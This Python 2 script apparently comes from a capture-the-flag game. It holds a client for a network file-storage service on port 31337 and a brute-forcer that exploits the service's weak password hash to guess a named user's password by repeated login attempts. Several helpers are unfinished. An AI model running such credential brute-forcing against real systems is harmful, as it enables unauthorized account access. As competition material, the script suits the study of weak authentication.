#!/usr/bin/env python

import socket
import sys
import md5
import random
import string
import itertools

SERVICE_PORT        = 31337

LOGIN_LEN           = 15
PASSW_LEN           = 8
CONTENT_LEN         = 50
FNAME_LEN           = 10

EXITCODE_OK         = 101
EXITCODE_WRONGFLAG  = 102
EXITCODE_FUNCLACK   = 103
EXITCODE_DOWN       = 104
EXITCODE_INVARG     = 110

RECV_SIZE           = 8192

# You probably should set it to 0 during the game
DEBUG               = 1



def gen_rand_printable(count):
    alphabet = string.uppercase + string.lowercase + string.digits
    lst = [random.choice(alphabet) for _ in xrange(count)]
    return ''.join(lst)

def gen_random_creds():
    login = gen_rand_printable(LOGIN_LEN)
    passw = gen_rand_printable(PASSW_LEN)

    return login, passw

def gen_creds_by_flag_id(flag_id):
    m = md5.new()
    m.update("1ai!E0S_" + flag_id)
    digest = m.hexdigest()
    login = digest[:LOGIN_LEN][::-1]
    passw = digest[-PASSW_LEN:][::-1]

    return login, passw

def debug(msg):
    if DEBUG: print(msg)
    
    

class Service(object):
    sock_desc = None
    def __init__(self, host, port):
        self.sock_desc = socket.socket()
        self.sock_desc.settimeout(100)
        try:
            self.sock_desc.connect((host, port))
            self.recv(1)
        except:
            exit(EXITCODE_DOWN)

    def __del__(self):
        self.sock_desc.close()

    def recv(self, c=0):
        res = self.sock_desc.recv(RECV_SIZE)
        if c == 1:
            while res.find("->") == -1:
                res = self.sock_desc.recv(RECV_SIZE)
        return res

    def send(self, msg, wait_c=0):
        self.sock_desc.send(str(msg)+"\n")
        if wait_c:
            res = self.recv(1)
        else:
            res = self.recv()
        return res

    def login_to(self, login, passw):
        res = self.send("LOGIN")
        res += self.send(login)
        res += self.send(passw)
        res += self.recv(1)
        if res.find("Hello") == -1:
            print("Can't login:")
            debug(res)
            return EXITCODE_FUNCLACK

        debug("Logged ok" + " ({}:{})".format(login, passw))
        return 0

    def register(self, login, passw):
        self.send("REGISTER")
        res = self.send(login)
        res += self.send(passw)
        res += self.recv(1)
        if res.find("Success registration") == -1:
            debug(res)
            return EXITCODE_FUNCLACK

        debug("Registered ok" + " ({}:{})".format(login, passw))
        return 0

    def allocate(self, count):
        self.send("ALLOCATE")
        res = self.send(count)
        res += self.recv(1)
        if res.find("Here, take free memory!") == -1:
            debug(res)
            return EXITCODE_FUNCLACK 

        debug("Allocated ok")
        return 0

    def upload(self, fname, content):
        self.send("UPLOAD")
        res = self.send(content)
        if res.find("Which file do you want this to write in?") == -1:
            debug(res)
            self.recv(1)
            return EXITCODE_FUNCLACK 

        res += self.send(fname)
        res += self.recv(1)
        if res.find("Uploading went well, you may now continue.") == -1:
            debug(res)
            return EXITCODE_FUNCLACK 

        debug("Uploaded ok")
        return 0

    def download(self, fname):
        res = self.send("DOWNLOAD")
        if res.find("What file do you want download?") == -1:
            debug("Download fail")
            debug(res)
            self.recv(1)
            return EXITCODE_FUNCLACK, ""

        res = self.send(fname)
        res += self.recv(1)
        debug("Downloaded ok")
        return 0, res

    def list_users(self):
        res = self.send("LIST USERS")
        res += self.recv(1)
        ul = map(lambda x: x.strip(), res.split('\n'))
        res_ul = []
        for item in ul:
            if item != '' and item != '->':
                res_ul.append(item)

        debug("User list: ")
        for item in res_ul:
            debug("\t"+item)

        return 0, res_ul

    def list_files(self):
        res = self.send("LIST FILES")
        res += self.recv(1)
        if res.find("Log in firstly") != -1:
            res_fl = []
        else:
            fl = map(lambda x: x.strip(), res.split('\n'))
            res_fl = []
            for item in fl:
                if item != '' and item != '->':
                    res_fl.append(item)

        debug("Files list: ")
        for item in res_fl:
            debug("\t"+item)

        return 0, res_fl
        
        
    def reg_and_login(self, login, password):
        self.register(login, password)
        ret = self.login_to(login, password)
        return ret



def collect_brute_space():
    alpha = string.lowercase + string.digits
    hm = {}
    for item in alpha:
        a = set()
        b = []
        for item2 in alpha:
            val = ord(item)/ord(item2)
            if val in a:
                continue
            a.add(ord(item)/ord(item2))
            b.append(item2)
        print("{} - {} - {}".format(item, a, b))
        hm[item] = b


def hellhash(login, passw):
    res = []
    str1 = login
    str2 = passw
    if len(str2) > len(str1):
        tmp = str2;
        str2 = str1
        str1 = tmp

    for i in xrange(len(str2)):
        res.append(ord(str1[i])/ord(str2[i]))

    print res


def check(s, login, passw):
    return s.login_to(login, passw)

def brute(login, passw_len, s):
    count_a_y = 0
    mask = []
    passw = []
    min_len = min(passw_len, len(login))

    for i in xrange(min_len):
        item = login[i]
        if ord(item) >= ord('a') and ord(item) <= ord('y'):
            count_a_y += 1
            mask.append(1)
        else:
            mask.append(0)
        passw.append('?')

    count_z_0_9 = min_len - count_a_y
    '''
    print count_a_y
    print count_z_0_9
    '''

    for guess in itertools.product("az0", repeat=count_a_y):

        k = 0
        for i in xrange(min_len):
            if mask[i] == 1:
                passw[i] = guess[k]
                k += 1

        for guess2 in itertools.product("a0", repeat=count_z_0_9):

            k = 0
            for i in xrange(min_len):
                if mask[i] == 0:
                    passw[i] = guess2[k]
                    k += 1

            ps = "".join(passw)
            if check(s, login, ps) == 0:
                print ps
                return


        

def gen_one_more_pass(login, passw):
    pairs = zip(map(ord, login[:4]), map(ord, passw[:4]))
    xored = map(lambda x: x[0] ^ x[1], pairs)


if __name__ == '__main__':

    if (len(sys.argv) < 4):
        print("python {} <host> <user_name> <password len>".format(sys.argv[0]))
        sys.exit(EXITCODE_INVARG)
        
    host = sys.argv[1]
    login = sys.argv[2]
    password_len = int(sys.argv[3])
    s = Service(host, SERVICE_PORT)
    brute(login, password_len, s)
